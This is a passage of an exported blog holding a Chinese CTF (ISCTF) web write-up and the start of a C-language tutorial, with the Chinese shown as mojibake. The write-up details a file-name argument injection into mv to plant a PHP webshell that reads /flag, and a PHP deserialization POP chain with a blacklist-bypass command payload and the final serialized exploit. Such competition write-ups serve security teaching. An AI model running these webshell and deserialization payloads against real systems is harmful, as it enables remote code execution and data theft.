class="variable">$filesInTmp</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">                <span class="variable">$message</span> .= <span class="string">&quot;å·²ç§»åŠ¨æ–‡ä»¶: <span class="subst">&#123;$file&#125;</span> è‡³<span class="subst">$targetDir</span><span class="subst">$file</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$message</span> .= <span class="string">&quot;ç§»åŠ¨æ–‡ä»¶å¤±è´¥: &quot;</span> .<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;, &#x27;</span>, <span class="variable">$output</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;å¤šæ–‡ä»¶ä¸Šä¼ æœåŠ¡&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body &#123; font-family: Arial, sans-serif; margin: <span class="number">20</span>px; &#125;</span><br><span class="line">        .container &#123; max-width: <span class="number">800</span>px; margin: auto; &#125;</span><br><span class="line">        .alert &#123; padding: <span class="number">10</span>px; margin: <span class="number">10</span>px <span class="number">0</span>; background: <span class="comment">#f8d7da; color: #721c24; border: 1px solid #f5c6cb; &#125;</span></span><br><span class="line">        .success &#123; background: <span class="comment">#d4edda; color: #155724; border-color: #c3e6cb; &#125;</span></span><br><span class="line">        ul &#123; <span class="keyword">list</span>-style-type: none; padding: <span class="number">0</span>; &#125;</span><br><span class="line">        li &#123; margin: <span class="number">5</span>px <span class="number">0</span>; padding: <span class="number">5</span>px; background: <span class="comment">#f0f0f0; &#125;</span></span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">h2</span>&gt;å¤šæ–‡ä»¶ä¸Šä¼ æœåŠ¡&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> <span class="title">if</span> ($<span class="title">message</span>): ?&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">alert</span> &lt;?= <span class="title">strpos</span>($<span class="title">message</span>, &#x27;å¤±è´¥&#x27;) ? &#x27;&#x27; : &#x27;<span class="title">success</span>&#x27; ?&gt;&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;?= $<span class="title">message</span> ?&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot; <span class="title">enctype</span>=&quot;<span class="title">multipart</span>/<span class="title">form</span>-<span class="title">data</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">files</span>&quot;&gt;é€‰æ‹©æ–‡ä»¶ï¼š&lt;/<span class="title">label</span>&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">name</span>=&quot;<span class="title">files</span>[]&quot; <span class="title">id</span>=&quot;<span class="title">files</span>&quot; <span class="title">multiple</span> <span class="title">required</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">name</span>=&quot;<span class="title">upload</span>&quot;&gt;ä¸Šä¼ åˆ°ä¸´æ—¶ç›®å½•&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">hr</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">h3</span>&gt;å¾…ç¡®è®¤ä¸Šä¼ æ–‡ä»¶&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> <span class="title">if</span> (<span class="title">empty</span>($<span class="title">filesInTmp</span>)): ?&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">p</span>&gt;æš‚æ— å¾…ç¡®è®¤ä¸Šä¼ æ–‡ä»¶&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> <span class="title">else</span>: ?&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;?<span class="title">php</span> <span class="title">foreach</span> ($<span class="title">filesInTmp</span> <span class="title">as</span> $<span class="title">file</span>): ?&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;&lt;?= <span class="title">htmlspecialchars</span>($<span class="title">file</span>) ?&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;?<span class="title">php</span> <span class="title">endforeach</span>; ?&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">name</span>=&quot;<span class="title">confirm_move</span>&quot;&gt;ç¡®è®¤ä¸Šä¼ å®Œæ¯•ï¼Œç§»åŠ¨åˆ°å­˜å‚¨ç›®å½•&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>é»‘åå•æ¯”è¾ƒå…¨é¢ï¼ŒåŠ ä¸Šé¢˜ç›®æ ‡é¢˜æ˜¯mv_uploadï¼ŒçŒœæµ‹æœ¬é¢˜è€ƒæŸ¥ç³»ç»Ÿå‘½ä»¤<code>mv</code></p>
<p>æºç ä¸­è·Ÿmvæœ‰å…³çš„æ˜¯ ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;cd <span class="subst">$uploadDir</span> ; mv * <span class="subst">$targetDir</span> 2&gt;&amp;1&quot;</span>, <span class="variable">$output</span>, <span class="variable">$returnCode</span>);</span><br></pre></td></tr></table></figure>

<p>åœ¨ç»ˆç«¯è¾“å…¥ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> --<span class="built_in">help</span></span><br></pre></td></tr></table></figure>

<p>å‡ºæ¥çš„ç¬¬ä¸€ä¸ªä½¿ç”¨æ–¹æ³•å¾ˆæœ‰æ„æ€ï¼Œæ˜¯åœ¨åé¢è·Ÿä¸Šâ€“backup</p>
<p>åŸç†æ˜¯å¦‚æœç›®æ ‡æ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œå†ç”¨mvç§»åŠ¨åŒåæ–‡ä»¶ä¼šæŠŠå…ˆå‰çš„æ–‡ä»¶è¦†ç›–ï¼Œä½†æ˜¯åŠ ä¸Šâ€“backupçš„è¯ï¼Œä¸ä¼šç›´æ¥è¦†ç›–å…ˆå‰çš„æ–‡ä»¶ï¼Œè€Œæ˜¯å…ˆæŠŠæ—§æ–‡ä»¶æ”¹åå¤‡ä»½ï¼Œç„¶åå†æŠŠæ–°æ–‡ä»¶ç§»è¿‡å»ã€‚</p>
<p>ä½†æ˜¯æœ¬é¢˜å•çº¯çš„æ”¹åæ²¡æœ‰ä»»ä½•æ„ä¹‰ï¼Œè¿™æ—¶å°±è¦ç”¨åˆ°å¦ä¸€ä¸ªï¼Œåœ¨åé¢è·Ÿä¸Šâ€“suffix&#x3D;ã€æƒ³è¦çš„åç¼€ã€‘ï¼Œè¿™æ ·å°±å¯ä»¥éšå¿ƒæ‰€æ¬²åœ°ä¿®æ”¹æƒ³è¦ä¸Šä¼ çš„æ–‡ä»¶åç¼€äº†</p>
<p>æœ¬é¢˜çš„æ”»å‡»é¡ºåºå¾ˆæ˜æœ—äº†</p>
<ol>
<li><p>åˆ›å»ºä¸€ä¸ªæ–‡ä»¶â€œshell.pâ€ï¼Œé‡Œé¢å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œæ¥ç€ä¸Šä¼ å¹¶ç§»åŠ¨</p>
</li>
<li><p>åˆ›å»ºæ–‡ä»¶â€œâ€“backupâ€å’Œâ€œâ€“suffix&#x3D;hpâ€ï¼Œæ¥ç€ä¸Šä¼ shell.pã€â€“backupå’Œâ€“suffix&#x3D;hpï¼ŒåŒæ—¶è¿›è¡Œç§»åŠ¨</p>
</li>
<li><p>è®¿é—®&#x2F;upload&#x2F;shell.phpï¼Œè‹¥æ˜¾ç¤ºç©ºç™½é¡µé¢å°±ä»£è¡¨æ”¹åæˆåŠŸï¼ŒPOSTä¼ å…¥cmd&#x3D;system(â€œcat &#x2F;flagâ€);å³å¯</p>
</li>
</ol>
<hr>
<h1 id="10-ezpop"><a href="#10-ezpop" class="headerlink" title="10. ezpop"></a>10. ezpop</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">begin</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;var1 = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;var1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$newFunc</span> = <span class="variable language_">$this</span>-&gt;var2;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$newFunc</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">starlord</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var4</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var5</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;var4;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;var5-&gt;<span class="title function_ invoke__">ll2</span>(<span class="string">&#x27;b2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">anna</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var6</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var7</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$long</span> = @<span class="variable language_">$this</span>-&gt;var6-&gt;<span class="title function_ invoke__">add</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$long</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;var7-&gt;tt2) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;yamada yamada&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eenndd</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$command</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|tail|more|less|php|tac|cat|sort|shell|nl|sed|awk| /i&quot;</span>, <span class="variable">$this</span>-&gt;command))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;command);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flaag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var11</span>=<span class="string">&quot;1145141919810&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;var11)) == <span class="number">666</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;var10-&gt;hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ISCTF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&quot;ISCTF&quot;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>é¦–å…ˆæ‰¾ç»ˆç‚¹ï¼Œåœ¨ç±» <code>eenndd</code>ä¸­æ‰¾åˆ°<code>eval($this-&gt;command);</code>ï¼Œè¿™é‡Œå°±æ˜¯è¦åˆ°çš„ç»ˆç‚¹</p>
</li>
<li><p>æ¥ç€é€†æ¨é€šè¿‡<code>__get($arg1)</code>æ‰¾åˆ°ä¸Šä¸€æ­¥ï¼Œè§¦å‘<code>__get</code>éœ€è¦å‡ºç°ä¸€ä¸ªä¸å­˜åœ¨çš„å±æ€§ï¼Œåœ¨ç±»<code>flaag</code> ä¸­æœ‰<code>return $this-&gt;var10-&gt;hey;</code>è®¿é—®çš„å±æ€§<code>hey</code>å¹¶ä¸å­˜åœ¨</p>
</li>
<li><p>è§¦å‘ <code>__invoke</code>è¦æŠŠå¯¹è±¡å½“æˆå‡½æ•°æ¥è°ƒç”¨ï¼Œåœ¨ç±»<code>starlord</code>ä¸­æœ‰<code>return $function();</code>ï¼ŒæŠŠ<code>$function</code>å½“å‡½æ•°ç”¨</p>
</li>
<li><p>è§¦å‘ <code>__call</code>éœ€è¦è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œåœ¨ç±»<code>anna</code>ä¸­æœ‰<code>$long = @$this-&gt;var6-&gt;add(); return $long;</code>ï¼Œadd() æ–¹æ³•å¹¶ä¸å­˜åœ¨</p>
</li>
<li><p>è§¦å‘ <code>__toString</code>éœ€è¦æŠŠä¸€ä¸ªå¯¹è±¡å½“åšå­—ç¬¦ä¸²å¤„ç†ï¼Œåœ¨ç±»<code>begin</code>ä¸­æœ‰<code>echo $this-&gt;var1;</code></p>
</li>
<li><p><code>__destruct</code> æ˜¯ååºåˆ—åŒ–åå¯¹è±¡é”€æ¯æ—¶è‡ªåŠ¨æ‰§è¡Œï¼Œå› æ­¤ä½œä¸ºèµ·ç‚¹</p>
</li>
</ol>
<p><strong>é“¾æ¡æ€»ç»“</strong>ï¼š <code>begin::__destruct()</code> -&gt; <code>anna::__toString()</code> -&gt; <code>starlord::__call()</code> -&gt; <code>flaag::__invoke()</code> -&gt; <code>eenndd::__get()</code> -&gt; <code>eval()</code></p>
<p>å…¶ä¸­è¿˜æœ‰ä¸¤ç‚¹éœ€è¦å¤„ç†ï¼š</p>
<ol>
<li><p><code>flaag</code> ç±»çš„ MD5 å¼±ç±»å‹æ¯”è¾ƒï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;var11)) == <span class="number">666</span>)</span><br></pre></td></tr></table></figure>

<p>éœ€è¦æ‰¾ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç»è¿‡ä¸¤æ¬¡ MD5 åŠ å¯†åï¼Œç»“æœä»¥ <code>666</code> å¼€å¤´</p>
<p>ç¼–å†™ä¸€ä¸ªMD5çˆ†ç ´çš„pyè„šæœ¬ï¼š</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>):</span><br><span class="line">    s = <span class="built_in">str</span>(i) </span><br><span class="line">    res = hashlib.md5(hashlib.md5(s.encode()).hexdigest().encode()).hexdigest()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> res.startswith(<span class="string">&quot;666&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°ï¼š213</p>
</li>
<li><p><code>eenndd</code> ç±»çš„æ­£åˆ™ç»•è¿‡ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|tail|more|less|php|tac|cat|sort|shell|nl|sed|awk| /i&quot;</span>, <span class="variable">$this</span>-&gt;command)</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®é»‘åå•æ„é€ payloadï¼š</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">passthru(&quot;uniq\$IFS\$9/f<span class="emphasis">*&quot;);    </span></span><br><span class="line"><span class="emphasis">//å¦‚æœå†™ca\tï¼Œé‚£\tä¼šè¢«phpè§£ææˆTabé”®ï¼›å¦‚æœåªå†™$IFS$9ï¼Œä¸¤ä¸ª$ä¼šè¢«phpè§£ææˆå˜é‡</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p>è¿™æ ·å°±å¯ä»¥æ ¹æ®å·²çŸ¥çš„popé“¾ç¼–å†™è„šæœ¬äº†ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">begin</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$var1</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">anna</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$var6</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">starlord</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$var4</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flaag</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$var10</span>; <span class="keyword">public</span> <span class="variable">$var11</span> = <span class="number">213</span>; &#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eenndd</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$command</span> = <span class="string">&#x27;passthru(&quot;uniq\$IFS\$9/f*&quot;);&#x27;</span>; &#125;        <span class="comment">//ä¸è¦ç”¨åŒå¼•å·åµŒå¥—åŒå¼•å·</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$exp</span> = <span class="keyword">new</span> <span class="title function_ invoke__">begin</span>();</span><br><span class="line"><span class="variable">$exp</span>-&gt;var1 = <span class="keyword">new</span> <span class="title function_ invoke__">anna</span>();</span><br><span class="line"><span class="variable">$exp</span>-&gt;var1-&gt;var6 = <span class="keyword">new</span> <span class="title function_ invoke__">starlord</span>();</span><br><span class="line"><span class="variable">$exp</span>-&gt;var1-&gt;var6-&gt;var4 = <span class="keyword">new</span> <span class="title function_ invoke__">flaag</span>();</span><br><span class="line"><span class="variable">$exp</span>-&gt;var1-&gt;var6-&gt;var4-&gt;var10 = <span class="keyword">new</span> <span class="title function_ invoke__">eenndd</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ISCTF=O%3A5%3A%22begin%22%3A1%3A%7Bs%3A4%3A%22var1%22%3BO%3A4%3A%22anna%22%3A1%3A%7Bs%3A4%3A%22var6%22%3BO%3A8%3A%22starlord%22%3A1%3A%7Bs%3A4%3A%22var4%22%3BO%3A5%3A%22flaag%22%3A2%3A%7Bs%3A5%3A%22var10%22%3BO%3A6%3A%22eenndd%22%3A1%3A%7Bs%3A7%3A%22command%22%3Bs%3A28%3A%22passthru%28%22uniq%5C%24IFS%5C%249%2Ff%2A%22%29%3B%22%3B%7Ds%3A5%3A%22var11%22%3Bi%3A213%3B%7D%7D%7D%7D</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="11-kaqiWeaponShop"><a href="#11-kaqiWeaponShop" class="headerlink" title="11. kaqiWeaponShop"></a>11. kaqiWeaponShop</h1>]]></content>
      <categories>
        <category>æ¯”èµ›WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Web</tag>
        <tag>ISCTF</tag>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>1. Cè¯­è¨€åŸºç¡€ä¸æ•°æ®</title>
    <url>/2025/12/10/1.%20C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E4%B8%8E%E6%95%B0%E6%8D%AE/</url>
    <content><![CDATA[<h1 id="ç¬¬ä¸€ç« ï¼šC-è¯­è¨€åŸºç¡€ä¸æ•°æ®"><a href="#ç¬¬ä¸€ç« ï¼šC-è¯­è¨€åŸºç¡€ä¸æ•°æ®" class="headerlink" title="ç¬¬ä¸€ç« ï¼šC è¯­è¨€åŸºç¡€ä¸æ•°æ®"></a>ç¬¬ä¸€ç« ï¼šC è¯­è¨€åŸºç¡€ä¸æ•°æ®</h1><hr>
<h2 id="1-C-è¯­è¨€ç¨‹åºçš„æœ€å°ç»“æ„"><a href="#1-C-è¯­è¨€ç¨‹åºçš„æœ€å°ç»“æ„" class="headerlink" title="1. C è¯­è¨€ç¨‹åºçš„æœ€å°ç»“æ„"></a>1. C è¯­è¨€ç¨‹åºçš„æœ€å°ç»“æ„</h2><p>æ‰€æœ‰çš„ C è¯­è¨€ç¨‹åºéƒ½å§‹äºä¸€ä¸ªæ ¸å¿ƒç»“æ„ã€‚</p>
<table>
<thead>
<tr>
<th><strong>ä»£ç è¡Œ</strong></th>
<th><strong>ä½œç”¨</strong></th>
<th><strong>è§£é‡Š</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>#include &lt;stdio.h&gt;</code></td>
<td><strong>å¤´æ–‡ä»¶åŒ…å«</strong></td>
<td>å¼•å…¥æ ‡å‡†è¾“å…¥è¾“å‡ºåº“ï¼ˆStandard Input&#x2F;Outputï¼‰ã€‚<code>printf</code>Â å‡½æ•°å°±å®šä¹‰åœ¨è¿™ä¸ªåº“ä¸­ã€‚<strong>æ²¡æœ‰å®ƒï¼Œä½ å°±ä¸èƒ½åœ¨å±å¹•ä¸Šæ‰“å°ä»»ä½•ä¸œè¥¿ã€‚</strong></td>
</tr>
<tr>
<td><code>int main() { ... }</code></td>
<td><strong>ä¸»å‡½æ•°å®šä¹‰</strong></td>
<td><code>main</code>Â æ˜¯ C ç¨‹åºçš„<strong>å…¥å£ç‚¹</strong>ã€‚æ“ä½œç³»ç»Ÿå°±æ˜¯ä»è¿™é‡Œå¼€å§‹æ‰§è¡Œä½ çš„ç¨‹åºçš„ã€‚<code>int</code>Â è¡¨ç¤ºè¿™ä¸ªå‡½æ•°æ‰§è¡Œå®Œæ¯•åä¼šè¿”å›ä¸€ä¸ªæ•´æ•°å€¼ã€‚</td>
</tr>
<tr>
<td><code>printf(&quot;...&quot;);</code></td>
<td><strong>æ ¸å¿ƒè¾“å‡ºè¯­å¥</strong></td>
<td>è°ƒç”¨Â <code>printf</code>Â å‡½æ•°ï¼Œå°†æ‹¬å·å†…çš„å­—ç¬¦ä¸²å†…å®¹æ‰“å°åˆ°å±å¹•ä¸Šã€‚<code>\n</code>Â æ˜¯ä¸€ä¸ª<strong>è½¬ä¹‰å­—ç¬¦</strong>ï¼Œè¡¨ç¤ºæ¢è¡Œã€‚</td>
</tr>
<tr>
<td><code>return 0;</code></td>
<td><strong>ç¨‹åºè¿”å›</strong></td>
<td>å‘Šè¯‰æ“ä½œç³»ç»Ÿç¨‹åºå·²ç»<strong>æˆåŠŸ</strong>æ‰§è¡Œå®Œæ¯•ã€‚åœ¨ C è¯­è¨€ä¸­ï¼Œ<code>return 0</code>Â é€šå¸¸è¡¨ç¤ºç¨‹åºæ­£å¸¸é€€å‡ºã€‚</td>
</tr>
</tbody></table>
<hr>
<h3 id="ä¹ é¢˜-1-å¯¹åº”ï¼šC-è¯­è¨€ç¨‹åºçš„æœ€å°ç»“æ„"><a href="#ä¹ é¢˜-1-å¯¹åº”ï¼šC-è¯­è¨€ç¨‹åºçš„æœ€å°ç»“æ„" class="headerlink" title="ä¹ é¢˜ 1 (å¯¹åº”ï¼šC è¯­è¨€ç¨‹åºçš„æœ€å°ç»“æ„)"></a><strong>ä¹ é¢˜ 1 (å¯¹åº”ï¼šC è¯­è¨€ç¨‹åºçš„æœ€å°ç»“æ„)</strong></h3><p><strong>é¢˜ç›®ï¼š</strong> è¯·ç¼–å†™ä¸€ä¸ªå®Œæ•´çš„ C è¯­è¨€ç¨‹åºï¼Œåœ¨å±å¹•ä¸Šæ‰“å°è¾“å‡ºå­—ç¬¦ä¸² <code>Hello, World!</code> å¹¶æ¢è¡Œã€‚</p>
<p><strong>è¦æ±‚ï¼š</strong> åŒ…å«å¿…è¦çš„å¤´æ–‡ä»¶ï¼Œä¸»å‡½æ•°ç»“æ„å®Œæ•´ï¼Œè¿”å›å€¼æ­£ç¡®ã€‚</p>
<p><strong>é¢„æœŸè¾“å‡ºç»“æœ</strong>ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello, World!</span><br></pre></td></tr></table></figure>

<p><strong>ç­”æ¡ˆï¼š</strong></p>
